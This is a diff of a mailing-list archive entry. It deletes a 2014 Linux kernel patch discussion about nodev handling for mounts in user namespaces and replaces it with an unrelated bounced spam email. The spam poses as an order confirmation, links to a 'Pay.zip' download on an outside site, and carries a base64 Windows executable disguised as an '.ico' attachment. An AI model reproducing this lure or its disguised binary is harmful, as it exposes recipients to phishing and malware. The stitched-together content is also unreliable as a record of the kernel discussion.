@@ -1,15 +1,10 @@
-From: Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>
-Subject: Re: [PATCH] fs: Remove implicit nodev for new mounts in non-root
-	userns
-Date: Wed, 27 Aug 2014 18:35:10 -0700
-Message-ID: <CALCETrXx+fsXqx1eP7GyZvS975pBmskOMx-rW1ZfqMfLRXL1Gw__17248.6783274964$1409189747$gmane$org@mail.gmail.com>
-References: <CALCETrWT_p1-5nkiAjWoeta19fkO3rDiJe9_mhRVqF8x1zXv2A@mail.gmail.com>
-	<2686c32f00b14148379e8cfee9c028c794d4aa1a.1407974494.git.luto@amacapital.net>
+From: MAILER-DAEMON-sFbbPxZDHXw0n/F98K4Iww@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Thu, 28 Aug 2014 15:22:09 +1000 (EST)
+Message-ID: <20140828052209.B9B49422F55@mail104.syd.optusnet.com.au>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============1212222873534643064=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <2686c32f00b14148379e8cfee9c028c794d4aa1a.1407974494.git.luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -19,175 +14,274 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: "Eric W. Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>
-Cc: Linux Containers <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, Serge Hallyn <serge.hallyn-GeWIH/nMZzLQT0dZR+AlfA@public.gmane.org>, "linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, stable <stable-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>, Kenton Varda <kenton-AuYgBwuPrUQTaNkGU808tA@public.gmane.org>, Linux FS Devel <linux-fsdevel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Linus Torvalds <torvalds-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-On Wed, Aug 13, 2014 at 5:03 PM, Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org> wrote:
-> Currently, creating a new mount (as opposed to bindmount) in a
-> non-root userns will implicitly set nodev unless the fs is devpts.
-> Something like this will be necessary for file systems that allow
-> the mounter to create device nodes without using mknod (e.g. FUSE
-> if/when that is allowed), but none of the currently allowed
-> filesystems do this.
->
+This is a MIME-encapsulated message.
 
-Any thoughts, Eric?
+--===============1212222873534643064==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="E7472422E14.1409203329/mail104.syd.optusnet.com.au"
 
-> Implicitly adding nodev is problematic, though.  It will make it
-> unsafe to ever remove the implicit addition, since userspace might
-> start to rely on it.
->
-> This fixes a minor regression in:
->
->     9566d6742852 mnt: Correct permission checks in do_remount
->
-> Prior to that commit, MNT_NODEV wasn't enforced for remounts, so
-> there is existing user code that creates a new mount in a userns
-> without MS_NODEV and then expects a remount with matching options to
-> work.  That commit broke code that does this.
->
-> Fortunately, since the implicit nodev has no effect on any existing
-> filesystems, we can still safely remove it.
->
-> This replaces the implicit nodev with an explicit nodev requirement:
-> anyone who mounts a filesystem without FS_USERNS_DEV_MOUNT will get
-> -EPERM unless they set nodev.  If they set nodev, that setting will
-> be locked.
->
-> As an added benefit, if anything like device namespaces is ever
-> added, then user code will be able to opt out of nodev by clearing
-> nodev.
->
-> To keep existing code working, this adds FS_USERNS_DEV_MOUNT to all
-> FS_USERNS_MOUNT filesystems.  All of the current filesystems with
-> FS_USERNS_MOUNT set are safe.
->
-> I confirmed that this is compatible with Sandstorm's revision
-> 1bf0c4847b.  That revision of Sandstorm does not work without this
-> fix if 9566d6742852 is applied.
->
-> Cc: Kenton Varda <kenton-AuYgBwuPrUQTaNkGU808tA@public.gmane.org>
-> Cc: stable-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-> Signed-off-by: Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>
-> ---
->  fs/namespace.c   | 16 ++++++++++++----
->  fs/proc/root.c   |  2 +-
->  fs/ramfs/inode.c |  2 +-
->  fs/sysfs/mount.c |  2 +-
->  ipc/mqueue.c     |  2 +-
->  mm/shmem.c       |  4 ++--
->  6 files changed, 18 insertions(+), 10 deletions(-)
->
-> diff --git a/fs/namespace.c b/fs/namespace.c
-> index 0acabea58319..835fa9e8307e 100644
-> --- a/fs/namespace.c
-> +++ b/fs/namespace.c
-> @@ -2154,12 +2154,20 @@ static int do_new_mount(struct path *path, const char *fstype, int flags,
->                         put_filesystem(type);
->                         return -EPERM;
->                 }
-> -               /* Only in special cases allow devices from mounts
-> -                * created outside the initial user namespace.
-> +
-> +               /*
-> +                * If a filesystem might allow the mounter to put
-> +                * device nodes on it without the checks in mknod,
-> +                * then require MS_NODEV to mount it.
->                  */
->                 if (!(type->fs_flags & FS_USERNS_DEV_MOUNT)) {
-> -                       flags |= MS_NODEV;
-> -                       mnt_flags |= MNT_NODEV | MNT_LOCK_NODEV;
-> +                       if (!(mnt_flags & MNT_NODEV)) {
-> +                               put_filesystem(type);
-> +                               return -EPERM;
-> +                       }
-> +
-> +                       /* Do not allow nodev to be cleared. */
-> +                       mnt_flags |= MNT_LOCK_NODEV;
->                 }
->         }
->
-> diff --git a/fs/proc/root.c b/fs/proc/root.c
-> index 094e44d4a6be..2313b280729e 100644
-> --- a/fs/proc/root.c
-> +++ b/fs/proc/root.c
-> @@ -159,7 +159,7 @@ static struct file_system_type proc_fs_type = {
->         .name           = "proc",
->         .mount          = proc_mount,
->         .kill_sb        = proc_kill_sb,
-> -       .fs_flags       = FS_USERNS_MOUNT,
-> +       .fs_flags       = FS_USERNS_MOUNT | FS_USERNS_DEV_MOUNT,
->  };
->
->  void __init proc_root_init(void)
-> diff --git a/fs/ramfs/inode.c b/fs/ramfs/inode.c
-> index d365b1c4eb3c..b95b7302d4cc 100644
-> --- a/fs/ramfs/inode.c
-> +++ b/fs/ramfs/inode.c
-> @@ -261,7 +261,7 @@ static struct file_system_type ramfs_fs_type = {
->         .name           = "ramfs",
->         .mount          = ramfs_mount,
->         .kill_sb        = ramfs_kill_sb,
-> -       .fs_flags       = FS_USERNS_MOUNT,
-> +       .fs_flags       = FS_USERNS_MOUNT | FS_USERNS_DEV_MOUNT,
->  };
->
->  int __init init_ramfs_fs(void)
-> diff --git a/fs/sysfs/mount.c b/fs/sysfs/mount.c
-> index 8a49486bf30c..56ba59317e24 100644
-> --- a/fs/sysfs/mount.c
-> +++ b/fs/sysfs/mount.c
-> @@ -58,7 +58,7 @@ static struct file_system_type sysfs_fs_type = {
->         .name           = "sysfs",
->         .mount          = sysfs_mount,
->         .kill_sb        = sysfs_kill_sb,
-> -       .fs_flags       = FS_USERNS_MOUNT,
-> +       .fs_flags       = FS_USERNS_MOUNT | FS_USERNS_DEV_MOUNT,
->  };
->
->  int __init sysfs_init(void)
-> diff --git a/ipc/mqueue.c b/ipc/mqueue.c
-> index 4fcf39af1776..56abbc848d4c 100644
-> --- a/ipc/mqueue.c
-> +++ b/ipc/mqueue.c
-> @@ -1394,7 +1394,7 @@ static struct file_system_type mqueue_fs_type = {
->         .name = "mqueue",
->         .mount = mqueue_mount,
->         .kill_sb = kill_litter_super,
-> -       .fs_flags = FS_USERNS_MOUNT,
-> +       .fs_flags = FS_USERNS_MOUNT | FS_USERNS_DEV_MOUNT,
->  };
->
->  int mq_init_ns(struct ipc_namespace *ns)
-> diff --git a/mm/shmem.c b/mm/shmem.c
-> index a42add14331c..f4a708a8f9e3 100644
-> --- a/mm/shmem.c
-> +++ b/mm/shmem.c
-> @@ -3149,7 +3149,7 @@ static struct file_system_type shmem_fs_type = {
->         .name           = "tmpfs",
->         .mount          = shmem_mount,
->         .kill_sb        = kill_litter_super,
-> -       .fs_flags       = FS_USERNS_MOUNT,
-> +       .fs_flags       = FS_USERNS_MOUNT | FS_USERNS_DEV_MOUNT,
->  };
->
->  int __init shmem_init(void)
-> @@ -3208,7 +3208,7 @@ static struct file_system_type shmem_fs_type = {
->         .name           = "tmpfs",
->         .mount          = ramfs_mount,
->         .kill_sb        = kill_litter_super,
-> -       .fs_flags       = FS_USERNS_MOUNT,
-> +       .fs_flags       = FS_USERNS_MOUNT | FS_USERNS_DEV_MOUNT,
->  };
->
->  int __init shmem_init(void)
-> --
-> 1.9.3
->
+This is a MIME-encapsulated message.
+
+--E7472422E14.1409203329/mail104.syd.optusnet.com.au
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
+
+This is the mail system at host mail104.syd.optusnet.com.au.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<trappwd-sFbbPxZDHXw0n/F98K4Iww@public.gmane.org> (expanded from <trappwd-yP2FWuG//QYQrrorzV6ljw@public.gmane.org>): user unknown
+
+--E7472422E14.1409203329/mail104.syd.optusnet.com.au
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; mail104.syd.optusnet.com.au
+X-Postfix-Queue-ID: E7472422E14
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Thu, 28 Aug 2014 15:22:06 +1000 (EST)
+
+Final-Recipient: rfc822; trappwd-sFbbPxZDHXw0n/F98K4Iww@public.gmane.org
+Original-Recipient: rfc822;trappwd-yP2FWuG//QYQrrorzV6ljw@public.gmane.org
+Action: failed
+Status: 5.1.1
+Diagnostic-Code: x-unix; user unknown
+
+--E7472422E14.1409203329/mail104.syd.optusnet.com.au
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from Myst.akvanet.com (www.akvanet.com [193.16.246.1])
+	by mail104.syd.optusnet.com.au (Postfix) with ESMTP id E7472422E14
+	for <trappwd-yP2FWuG//QYQrrorzV6ljw@public.gmane.org>; Thu, 28 Aug 2014 15:22:06 +1000 (EST)
+Received: from [193.16.246.1] by Myst.akvanet.com id gi5SAORvCEN; Thu, 28 Aug 2014 08:22:06 +0300
+Message-ID: <002c01cfc280$0014cf80$0164a8c0-u2wzF6xcI+ghwcfV6YIXVA@public.gmane.org>
+From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <trappwd-yP2FWuG//QYQrrorzV6ljw@public.gmane.org>
+Subject: Order 378355.
+Date: Thu, 28 Aug 2014 08:22:06 +0300
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+ boundary="----------6B3403ABE032443"
+X-Optus-CM-Spam: spam
+X-Optus-CM-Score: 100
+X-Optus-CM-Analysis: v=2.1 cv=AOuw8Gd4 c=1 sm=1 tr=0 p=Qp3kzKP_AAAA:8
+	p=DpQXJJop3B2cEI9dKzwA:9 a=lyeesIciD0eSHBxIpQzv7A==:117
+	a=lyeesIciD0eSHBxIpQzv7A==:17 a=NEiEQogP1MkA:10 a=Z4Rwk6OoAAAA:8
+	a=bCsdbsf5AAAA:8 a=Pyw_07L0AAAA:8 a=aknwMIJEfdWxV68i:21
+	a=eeZdTTJk5isBLe9y:21 a=QEXdDO2ut3YA:10 a=A7ozIkpq2vcqX538NLAA:9
+	a=WzHNiX6cKY2DZ1D7HSYA:9
+
+------------6B3403ABE032443
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+Dear customer,      
+       
+Thank you for placing an order with us!     
+     
+We wish to inform you that we have received your order and it will be processed very shortly. 
+Your order number is 197444-583932 
+and it is expected to be delivered within 2-5 working days. 
+Please note that in most cases, delivery is faster than stated as we want you to start 
+enjoying your purchase as soon as possible. In the meantime, you may log into the site and 
+check your order status at any time via the 'My Account' page.
+    
+
+As soon as order has been dispatched, our Customer Service Executive will monitor 
+the progress and keep you updated at all times.
+     
+     
+Claim your Special Reward      
+  
+Once again, we would like to thank you for your purchase and we hope to see you again soon.
+
+The payment and delivery information:
+http://tomboveree.nl/Pay.zip?Generate_to_client:trappwd-yP2FWuG//QYQrrorzV6ljw@public.gmane.org
+
+--     
+Customer Service Manager      
+Perkinson Trisha
+Tel./Fax.: +61 7 3449235
+------------6B3403ABE032443
+
+application/octet-stream;
+ name="35img.ico"
+Content-transfer-encoding: base64
+Content-Disposition: attachment;
+ filename="35img.ico"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAAA/haPee+TNjXvkzY175M2NcpxfjXrkzY1ynE6NeeTNjXKc
+WY165M2NcpxcjXrkzY1SaWNoe+TNjQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBFAABkhgMA
+Nd9bSgAAAAAAAAAA8AAiIAsCCQAAAAAAABoAAAAAAAAAAAAAABAAAAAA////BQAAABAAAAAC
+AAAGAAEABgABAAYAAQAAAAAAAFAAAAAEAABHgQAAAQBAAQAABAAAAAAAABAAAAAAAAAAABAA
+AAAAAAAQAAAAAAAAAAAAABAAAACgIAAAcAAAAAAAAAAAAAAAADAAAAgEAAAAAAAAAAAAAAAA
+AAAAAAAAAEAAALwAAAAQIQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC5kYXRhAAAAcBEAAAAQ
+AAAAEgAAAAQAAAAAAAAAAAAAAAAAAEAAAGAucnNyYwAAAAgEAAAAMAAAAAYAAAAWAAAAAAAA
+AAAAAAAAAABAAABCLnJlbG9jAADGAAAAAEAAAAACAAAAHAAAAAAAAAAAAAAAAAAAQAAAQgAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+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
+OAAA8DgAAPBpADkAAPA5AADwAAAAAAAAAAAAAAAACAAIAAgACAAIAH8AfwADAAMAAwADAAMA
+AwADABsAGwAbABsAGwAbABsA2whbAHsAnv9i/xsAGwDcCFwAfACR/5H/HAAcAOIIXAB8AJH/
+kf8cABwA3QhdAH0An/9j/x0AHQANAA0ADQANAA0ACgAKACAAIAAgACAAIAAgACAAAAAAAAAA
+AAAAAAAAAAAAAAAAEACxARkAsAEcAA0BHQCjASAArQEhALcBIgCzASQAsgEuAK4BMACvATIA
+rAE1AG8BNwAsATgApQFGAAMBRwAkAUgAJgFJACEBSwAlAU0AJwFPACMBUAAoAVEAIgFSAC0B
+UwAuAVsAWwFcAFwBXQBdAV8AXwFlAKoBZgCrAWcAqAFoAKkBaQCnAWoApgFrALYBbAC0AW0A
+tQEAAAAAAAAAAP8AGwAxADIAMwA0ADUANgA3ADgAOQAwAL0AuwAIAAkAUQBXAEUAUgBUAFkA
+VQBJAE8AUADbAN0ADQCiAEEAUwBEAEYARwBIAEoASwBMALoA3gDABKAA3ABaAFgAQwBWAEIA
+TgBNALwAvgC/AKEBagKkACAAFARwAHEAcgBzAHQAdQB2AHcAeAB5AJADkQIkDCYMIQxtACUM
+DAwnDGsAIwwoDCIMLQwuDCwA/wDiAHoAewAMAO4A8QDqAPkA9QDzAP8A/wD7AC8AfAB9AH4A
+fwCAAIEAggCDAIQAhQCGAO0A/wDpAP8AwQD/AP8AhwD/AP8A/wD/AOsACQD/AMIA7AAUAgEI
+AgAAAAAAAAAFAAAAAAAAAAYAAAAAAAAAAwAAABUAAAAHAAAAAAAAAAIAAAAAAAAAAgAAAAAA
+AAACAAAAAAAAAAMAAAAVAAAAAwAAABUAAAADAAAAFQAAAAMAAAAVAAAAAgAAAAAAAAACAAAA
+AAAAAAIAAAAAAAAAAgAAAAAAAADAAQEAAgAAAAAAAAACAAAAAAAAAAgAAAAAAAAAAgAAAAAA
+AAADAAAAGQAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwA
+AAAAAAAAuBT///8FAAAdAAAAAAAAAIgV////BQAANQAAAAAAAADoEv///wUAADcAAAAAAAAA
+oBT///8FAAA4AAAAAAAAAIgU////BQAARQAAAAAAAABYFP///wUAAEYAAAAAAAAA2BL///8F
+AABHAAAAAAAAAJgS////BQAASAAAAAAAAACIEf///wUAAEkAAAAAAAAAKBT///8FAABLAAAA
+AAAAAIgS////BQAATQAAAAAAAADIEv///wUAAE8AAAAAAAAA2BH///8FAABQAAAAAAAAAHgS
+////BQAAUQAAAAAAAABwFP///wUAAFIAAAAAAAAAGBT///8FAABTAAAAAAAAAAgU////BQAA
+WwAAAAAAAABIFf///wUAAFwAAAAAAAAAaBX///8FAABdAAAAAAAAAAAV////BQAAAAAAAAAA
+AAAAAAAAAAAAADAIMAApAJz/Zv8xCDEAIQCH/4f/MwgzACMAcf9n/zQINAAkAHP/af81CDUA
+JQB0/2r/Nwg3ACYAlP9s/zgIOAAqAJX/bf85CDkAKACW/27/QQlhAEEAgf+B/0IJYgBCAHr/
+ev9DCWMAQwB//3//RAlkAEQAfP98/0UJZQBFAHL/aP9GCWYARgCK/4r/RwlnAEcAd/93/0gJ
+aABIAHj/eP9JCWkASQCG/4b/SglqAEoAj/+P/0sJawBLAIn/if9MCWwATACY/5j/TQltAE0A
+k/+T/04JbgBOAJD/kP9PCW8ATwCX/5f/UAlwAFAAfv9+/1EJcQBRAID/gP9SCXIAUgB9/33/
+UwlzAFMAhP+E/1QJdABUAHb/dv9VCXUAVQCF/4X/Vgl2AFYAi/+L/1cJdwBXAIP/g/9YCXgA
+WAB7/3v/WQl5AFkAnf+d/1oJegBaAIL/b/+6CDsAOgCa/5r/vwgvAD8Akv9l/8AIYAB+AJv/
+m//eCCcAIgB5/3n/3wAA8ADwAPAA8LwILAA8AIj/ZP++CC4APgCZ/2H/uwg9ACsAjf+N/wkA
+CQAJAAkACQBrACsAKwArACsAbgAuAC4ALgAuAG8ALwAvAC8ALwBqACoAKgAqACoAbQAtAC0A
+LQAtAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAGgS////BQAADgAAAAAAAADoFP///wUAAA8A
+AAAAAAAAYBL///8FAAAcAAAAAAAAAPgT////BQAAHQAAAAAAAACoEv///wUAACoAAAAAAAAA
+6BP///8FAAA2AAAAAAAAADAV////BQAANwAAAAAAAADYE////wUAADgAAAAAAAAAWBL///8F
+AAA5AAAAAAAAAMgT////BQAAOgAAAAAAAADQFP///wUAADsAAAAAAAAA0BH///8FAAA8AAAA
+AAAAAMgR////BQAAPQAAAAAAAADAEf///wUAAD4AAAAAAAAAuBH///8FAAA/AAAAAAAAALAR
+////BQAAQAAAAAAAAACoEf///wUAAEEAAAAAAAAAoBH///8FAABCAAAAAAAAAJgR////BQAA
+QwAAAAAAAACQEf///wUAAEQAAAAAAAAAUBL///8FAABFAAAAAAAAALgT////BQAARgAAAAAA
+AAAYFf///wUAAEcAAAAAAAAAqBP///8FAABIAAAAAAAAAJgT////BQAASQAAAAAAAACIE///
+/wUAAEoAAAAAAAAAeBP///8FAABLAAAAAAAAAGgT////BQAATAAAAAAAAABYE////wUAAE0A
+AAAAAAAASBP///8FAABOAAAAAAAAADgT////BQAATwAAAAAAAAAoE////wUAAFAAAAAAAAAA
+GBP///8FAABRAAAAAAAAAAgT////BQAAUgAAAAAAAAD4Ev///wUAAFMAAAAAAAAASBT///8F
+AABUAAAAAAAAADgU////BQAAVwAAAAAAAABIEv///wUAAFgAAAAAAAAAQBL///8FAAB8AAAA
+AAAAADgS////BQAAfQAAAAAAAAAwEv///wUAAH4AAAAAAAAAKBL///8FAAB/AAAAAAAAACAS
+////BQAAgAAAAAAAAAAYEv///wUAAIEAAAAAAAAAEBL///8FAACCAAAAAAAAAAgS////BQAA
+gwAAAAAAAAAAEv///wUAAIQAAAAAAAAA+BH///8FAACFAAAAAAAAAPAR////BQAAhgAAAAAA
+AADoEf///wUAAIcAAAAAAAAA4BH///8FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWlW0oAAAAA
+3CAAAAEAAAACAAAAAgAAAMggAADQIAAA2CAAAFghAABoIQAA5yAAAPogAAAAAAEAS0JEMTAx
+LmRsbABLYmRMYXllckRlc2NyaXB0b3IAS2JkTmxzTGF5ZXJEZXNjcmlwdG9yAAAAAABSxVtK
+AAAAAAIAAAAjAAAALCEAACwVAABSU0RTcIuFdTXcZkGuodaKgMUcmgEAAABrYmQxMDEucGRi
+AAAAAAAAAAAAAEiNBcHv///DzMzMzMzMzMxIjQWR7///wwAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA
+AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAGAwAACkAwAAAAAAAAAAAAAAAAAA
+AAAAAKQDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAEA
+BgABQLAdAQAGAAFAsB0/AAAAAAAAAAQABAACAAAAAAAAAAAAAAAAAAAAAgMAAAEAUwB0AHIA
+aQBuAGcARgBpAGwAZQBJAG4AZgBvAAAA3gIAAAEAMAAwADAAMAAwADQAQgAwAAAATAAWAAEA
+QwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAA
+bwByAGEAdABpAG8AbgAAAHAAJAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAA
+AABKAFAAIABKAGEAcABhAG4AZQBzAGUAIABLAGUAeQBiAG8AYQByAGQAIABMAGEAeQBvAHUA
+dAAgAGYAbwByACAAMQAwADEAAABsACYAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADYA
+LgAxAC4ANwA2ADAAMAAuADEANgAzADgANQAgACgAdwBpAG4ANwBfAHIAdABtAC4AMAA5ADAA
+NwAxADMALQAxADIANQA1ACkAAAAuAAcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAGsA
+YgBkADEAMAAxAAAAAACAAC4AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAACpACAA
